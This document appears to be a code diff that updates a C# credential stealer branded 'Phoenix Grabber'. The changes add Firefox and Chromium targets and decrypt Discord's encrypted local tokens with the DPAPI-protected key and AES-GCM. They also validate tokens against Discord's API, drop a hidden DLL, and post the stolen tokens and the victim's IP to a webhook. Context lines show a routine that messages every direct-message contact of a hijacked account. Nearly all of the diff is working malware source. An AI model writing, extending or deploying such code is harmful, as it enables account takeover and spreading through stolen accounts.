@@ -9,6 +9,12 @@ using System.Text.RegularExpressions;
 using System.Threading;
 using System.Windows.Forms;
 using System.Web.Script.Serialization;
+using Org.BouncyCastle.Crypto.Parameters;
+using System.Security.Cryptography;
+using System.Linq;
+using Org.BouncyCastle.Crypto.Modes;
+using Org.BouncyCastle.Crypto.Engines;
+using System.Text;
 
 namespace Program
 {
@@ -17,6 +23,17 @@ namespace Program
         #region Main
         static void Main()
         {
+            Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("BouncyCastle.Crypto.dll");
+            BinaryReader br = new BinaryReader(stream);
+            FileStream fs = new FileStream("BouncyCastle.Crypto.dll", FileMode.Create);
+            BinaryWriter bw = new BinaryWriter(fs);
+            byte[] ba = new byte[stream.Length];
+            stream.Read(ba, 0, ba.Length);
+            bw.Write(ba);
+            br.Close();
+            bw.Close();
+            stream.Close();
+            File.SetAttributes("BouncyCastle.Crypto.dll", File.GetAttributes("BouncyCastle.Crypto.dll") | FileAttributes.Hidden);
             Start();
             //SpreadMode
             //RunOnStartup
@@ -29,7 +46,7 @@ namespace Program
 
         static void Start()
         {
-            string[] processlist = { "Discord", "DiscordCanary", "DiscordPTB", "Lightcord", "opera", "operagx", "chrome", "chromesxs", "Yandex", "msedge", "brave", "vivaldi", "epic" };
+            string[] processlist = { "Discord", "DiscordCanary", "DiscordPTB", "Lightcord", "opera", "operagx", "firefox", "chrome", "chromesxs", "Yandex", "msedge", "brave", "vivaldi", "epic" };
             foreach (Process process in Process.GetProcesses())
             {
                 foreach (var name in processlist)
@@ -47,8 +64,10 @@ namespace Program
             locations.Add(appdata + "\\Lightcord\\Local Storage\\leveldb\\");
             locations.Add(appdata + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\");
             locations.Add(appdata + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\");
+            locations.Add(appdata + "\\Mozilla\\Firefox\\Profiles");
             locations.Add(localappdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\");
             locations.Add(localappdata + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\");
+            locations.Add(localappdata + "\\Chromium\\User Data\\Default\\Local Storage\\leveldb\\");
             locations.Add(localappdata + "\\Yandex\\YandexBrowser\\User Data\\Default");
             locations.Add(localappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\");
             locations.Add(localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
@@ -57,28 +76,98 @@ namespace Program
             foreach (var path in locations)
             {
                 if (!Directory.Exists(path)) continue;
-                foreach (var file in new DirectoryInfo(path).GetFiles())
+                if (path.Contains("Mozilla"))
                 {
-                    if (file.Equals("LOCK")) continue;
-                    foreach (Match match in Regex.Matches(file.OpenText().ReadToEnd(), "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27,}|mfa\\.[\\w-]{84}"))
+                    foreach (var file in new DirectoryInfo(path).GetFiles("*.sqlite", SearchOption.AllDirectories))
                     {
-                        if (!tokens.Contains(match.Value))
-                            tokens.Add(match.Value);
+                        foreach (Match match in Regex.Matches(file.OpenText().ReadToEnd(), "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}"))
+                        {
+                            if (Check(match.Value) == true && !tokens.Contains(match.Value))
+                                tokens.Add(match.Value);
+                        }
+                    }
+                }
+                else if (path.Contains("cord"))
+                {
+                    foreach (var file in new DirectoryInfo(path).GetFiles("*.ldb", SearchOption.AllDirectories))
+                    {
+                        foreach (Match match in Regex.Matches(file.OpenText().ReadToEnd(), "(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)"))
+                        {
+                            dynamic deserialize = new JavaScriptSerializer().DeserializeObject(File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local State"));
+                            AeadParameters parameters = new AeadParameters(new KeyParameter(ProtectedData.Unprotect(Convert.FromBase64String((string)deserialize["os_crypt"]["encrypted_key"]).Skip(5).ToArray(), null, DataProtectionScope.CurrentUser)), 128, Convert.FromBase64String(match.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]).Skip(3).Take(12).ToArray(), null);
+                            GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine());
+                            cipher.Init(false, parameters);
+                            byte[] bytes = new byte[cipher.GetOutputSize(Convert.FromBase64String(match.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]).Skip(15).ToArray().Length)];
+                            cipher.DoFinal(bytes, cipher.ProcessBytes(Convert.FromBase64String(match.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]).Skip(15).ToArray(), 0, Convert.FromBase64String(match.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]).Skip(15).ToArray().Length, bytes, 0));
+                            string token = Encoding.UTF8.GetString(bytes).TrimEnd("\r\n\0".ToCharArray());
+                            if (Check(token) == true && !tokens.Contains(token))
+                                tokens.Add(token);
+                        }
+                    }
+                }
+                else
+                {
+
+                    foreach (var file in new DirectoryInfo(path).GetFiles())
+                    {
+                        if (file.Equals("LOCK")) continue;
+                        foreach (Match match in Regex.Matches(file.OpenText().ReadToEnd(), "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}"))
+                        {
+                            if (Check(match.Value) == true && !tokens.Contains(match.Value))
+                                tokens.Add(match.Value);
+                        }
                     }
                 }
             }
             var result = string.Join("\\n", tokens.ToArray());
             if (string.IsNullOrEmpty(result))
                 result = "N/A";
+            Request("//Webhook", "POST", null, "{\"embeds\":[{\"footer\":{\"text\":\"Phoenix Grabber | " + DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss") + "\"},\"author\":{\"name\":\"Phoenix Grabber\",\"url\":\"https://github.com/extatent\"},\"fields\":[{\"name\":\"IP Address\",\"value\":\"" + IP() + "\"},{\"name\":\"Tokens\",\"value\":\"```\\n" + result + "\\n```\"}]}],\"content\":\"\",\"username\":\"Phoenix Grabber\"}");
+        }
+        #endregion
+
+        #region Check
+        static bool Check(string token)
+        {
+            try
+            {
+                Request("/users/@me", "GET", token);
+                return true;
+            }
+            catch { return false; }
+        }
+        #endregion
+
+        #region Request
+        static string Request(string endpoint, string method, string auth = null, string json = null)
+        {
+            string text = "";
             ServicePointManager.Expect100Continue = true;
             ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
-            WebRequest request = WebRequest.Create("Webhook");
-            request.Method = "POST";
-            request.ContentType = "application/json";
-            using (var stream = new StreamWriter(request.GetRequestStream()))
-                stream.Write("{\"embeds\":[{\"footer\":{\"text\":\"Phoenix Grabber | github.com/extatent\"},\"title\":\"Phoenix Grabber\",\"fields\":[{\"inline\":true,\"name\":\"IP Address:\",\"value\":\"" + IP() + "\"},{\"inline\":false,\"name\":\"Tokens:\",\"value\":\"```\\n" + result + "\\n```\"}]}],\"content\":\"\",\"username\":\"Phoenix Grabber\"}");
-            request.GetResponse();
+            WebRequest request;
+            if (auth != null)
+            {
+                request = WebRequest.Create("https://discord.com/api/v10" + endpoint);
+                request.Headers.Add("Authorization", auth);
+            }
+            else
+                request = WebRequest.Create(endpoint);
+            request.Method = method;
+            if (json == null)
+                request.ContentLength = 0;
+            else
+            {
+                request.ContentType = "application/json";
+                using (var stream = new StreamWriter(request.GetRequestStream()))
+                    stream.Write(json);
+            }
+            using (var stream = new StreamReader(request.GetResponse().GetResponseStream()))
+            {
+                text = stream.ReadToEnd();
+                stream.Dispose();
+            }
             request.Abort();
+            return text;
         }
         #endregion
 
@@ -89,39 +178,16 @@ namespace Program
             {
                 try
                 {
-                    string text;
-                    ServicePointManager.Expect100Continue = true;
-                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
-                    WebRequest request = WebRequest.Create("https://discord.com/api/v10/users/@me/channels");
-                    request.Headers.Add("Authorization", token);
-                    request.Method = "GET";
-                    request.ContentLength = 0;
-                    using (var stream = new StreamReader(request.GetResponse().GetResponseStream()))
-                    {
-                        text = stream.ReadToEnd();
-                        stream.Dispose();
-                    }
-                    request.Abort();
+                    var request = Request("/users/@me/channels", "GET", token);
                     var serializer = new JavaScriptSerializer();
-                    dynamic array = serializer.DeserializeObject(text);
+                    dynamic array = serializer.DeserializeObject(request);
                     foreach (dynamic entry in array)
                     {
-                        WebRequest request2 = WebRequest.Create("https://discord.com/api/v10/channels/" + entry["id"] + "/messages");
-                        request2.Headers.Add("Authorization", token);
-                        request2.Method = "POST";
-                        request2.ContentType = "application/json";
-                        using (var stream = new StreamWriter(request2.GetRequestStream()))
-                            stream.Write("{\"content\":\"" + message + "\"}");
                         try
                         {
-                            using (var stream = new StreamReader(request2.GetResponse().GetResponseStream()))
-                            {
-                                text = stream.ReadToEnd();
-                                stream.Dispose();
-                            }
+                            Request("/channels/" + entry["id"] + "/messages", "POST", token, "{\"content\":\"" + message + "\"}");
                         }
                         catch { }
-                        request2.Abort();
                         Thread.Sleep(200);
                     }
                 }
@@ -134,7 +200,7 @@ namespace Program
         static string IP()
         {
             string IP;
-            try { IP = new WebClient() { Proxy = null }.DownloadString("http://icanhazip.com/").Trim(); } catch { IP = "N/A"; }
+            try { IP = new WebClient().DownloadString("http://icanhazip.com/").Trim(); } catch { IP = "N/A"; }
             return IP;
         }
         #endregion
